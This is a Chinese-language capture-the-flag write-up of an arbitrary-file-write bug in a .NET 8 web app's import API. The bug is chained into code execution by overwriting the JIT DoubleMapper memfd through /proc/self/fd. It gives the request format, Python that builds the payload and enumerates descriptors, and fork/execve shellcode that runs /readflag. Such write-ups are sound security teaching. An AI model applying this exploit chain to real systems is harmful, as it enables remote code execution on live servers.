# Mafuyuuuuu

## 题目简述

题目表面上是由 nginx、Vite 前端和 .NET 8 后端组成的音乐站点。flag 位于后端容器的 `/flag`，仅 root 可读；容器提供了 setuid 程序 `/readflag`，因此目标是让后端执行命令，再把结果写到可以通过 Web 接口读取的位置。

附件没有提供后端源码，核心逻辑位于 `PaperTrailDesk.dll`。反编译该程序集可以发现，实时包导入接口允许客户端通过 `chart` 字段指定导出文件路径。将这个任意文件写原语对准 .NET JIT 的 DoubleMapper 文件描述符，就能覆盖可执行代码的后备存储并获得原生代码执行。

虽然漏洞入口是 Web API，但最终利用依赖 Linux 下 .NET JIT 的可写/可执行双映射机制，决定性障碍属于 Pwn。

## 解题过程

### 1. 还原导入接口的数据格式

参考脚本向以下接口发送 JSON：

```text
POST /api/sekai/live-package/import
```

请求结构为：

```json
{
  "name": "x",
  "body": "<Base64 数据>",
  "chart": "x;b64;false;/proc/self/fd/8"
}
```

对 `PaperTrailDesk.dll` 做 IL 级检查后，可以还原出 `chart` 的四个分号分隔字段：

```text
Name ; Format ; Append ; Lane
```

其中：

- `Format=b64` 表示先对 `body` 做 Base64 解码；
- `Append=false` 表示不追加旧内容；
- `Lane` 被直接作为 `FileStream` 的目标路径。

程序对普通导出名称另有安全检查，但导入流程使用 `Lane` 时没有把路径限制在 `/app/exports`，也没有拒绝绝对路径或 `/proc/self/fd/N`。于是攻击者可以向后端进程已经打开的任意可写文件描述符写入大量字节。

### 2. 理解 DoubleMapper 文件描述符

.NET 运行时需要同时满足两件事：

- JIT 编译器要向代码页写入机器码；
- 执行时的代码页应保持可执行，避免长期存在 RWX 映射。

题目环境使用 DoubleMapper：同一份 memfd 后备存储被映射成可写别名和可执行别名。两段虚拟地址权限不同，但内容来自同一个文件对象。后端进程的 `/proc/self/fd/` 中因此存在指向该对象的描述符。

导入接口若写入这个描述符，修改会同步反映到 JIT 可执行映射。问题从“任意文件写”升级成了“覆盖进程将要执行的机器码”。

描述符编号会随运行时初始化情况变化，不能硬编码。官方脚本优先尝试常见的 `8`，再枚举 `3` 到 `79`：

```python
candidates = [8] + [fd for fd in range(3, 80) if fd != 8]
```

### 3. 构造可以安全返回的 fork shellcode

直接在 JIT 线程中执行 `/bin/bash` 会破坏原调用约定，也容易导致服务在 flag 落盘前退出。参考 shellcode先执行 `fork()`：

```text
push rbp
mov  rbp, rsp
mov  eax, 57
syscall
test eax, eax
jz   child
xor  eax, eax
pop  rbp
ret
```

父进程返回 `0`，让误入该代码页的托管调用尽量继续运行；子进程则构造：

```text
execve("/bin/bash", ["bash", "-c", command], NULL)
```

默认命令为：

```bash
/readflag > /app/exports/flag.txt
```

这既利用 setuid 程序读取 `/flag`，又把结果写入应用本来就允许下载的导出目录。

官方脚本用 RIP 相对寻址把 `/bin/bash`、`bash`、`-c` 和命令字符串放在 shellcode 尾部，因此整段载荷不依赖固定虚拟地址。

### 4. 用逐页重复载荷覆盖 JIT 后备文件

单页载荷由 NOP、shellcode 和尾部 NOP 组成：

```python
PAGE_SIZE = 4096

def build_payload(command):
    shellcode = build_shellcode(command)
    page_payload = (
        b"\x90" * (PAGE_SIZE - len(shellcode) - 16)
        + shellcode
        + b"\x90" * 16
    )
    return page_payload * 2048
```

最终大小为：

```text
4096 × 2048 = 8 MiB
```

把相同内容放进每个 4 KiB 页面，是为了覆盖较大的 DoubleMapper 后备区：无论后续执行落到其中哪一页，都有很大机会先进入 NOP 滑道，再到达页尾的 shellcode。尾部保留 16 字节 NOP，也降低从页边界附近进入时立即遇到无效指令的概率。

载荷经 Base64 编码后写入候选描述符：

```python
body = base64.b64encode(build_payload(command)).decode()

for fd in candidates:
    chart = f"x;b64;false;/proc/self/fd/{fd}"
    requests.post(
        base + "/api/sekai/live-package/import",
        json={
            "name": "x",
            "body": body,
            "chart": chart,
        },
        timeout=5,
    )
```

写错普通描述符可能报错、断开连接或暂时破坏某个非关键文件，所以脚本捕获请求异常后继续枚举。写中正确描述符后，只要服务再次执行受影响的 JIT 代码，便会进入载荷。

### 5. 触发 JIT 代码并读取 flag

参考脚本在每次写入后访问 `/healthz`。这个请求一方面确认服务仍然存活，另一方面促使后端继续执行托管/JIT 代码，从而触发已经被替换的代码页。

随后轮询：

```text
GET /sekai/replays/flag.txt
```

该路由会从 `/app/exports` 返回指定导出文件。子进程成功执行默认命令后，接口响应即为 flag。

完整运行方式为：

```bash
python3 solve/solve.py http://127.0.0.1:8089
```

脚本也允许在目标地址后提供自定义命令。只有使用默认命令时，它才会继续轮询并打印 flag；使用自定义命令时，脚本在发送成功后直接返回。

## 方法总结

本题的完整链条为：

1. 逆向 `PaperTrailDesk.dll`，确认导入接口按 `Name;Format;Append;Lane` 解析 `chart`；
2. 利用未经路径约束的 `Lane`，向 `/proc/self/fd/N` 写入任意内容；
3. 枚举 .NET DoubleMapper 使用的 memfd 描述符；
4. 用 8 MiB 的逐页 NOP 滑道和位置无关 shellcode覆盖 JIT 后备存储；
5. 通过健康检查触发托管代码执行；
6. shellcode fork 子进程并运行 `/readflag > /app/exports/flag.txt`；
7. 从正常的 replay 下载路由取回 flag。

最重要的分析转折是：任意文件写不应只盯着配置文件、计划任务或 Web 根目录。在同进程存在 JIT、共享内存或其他特殊文件描述符时，`/proc/self/fd/` 可能把文件写直接连接到代码执行原语。
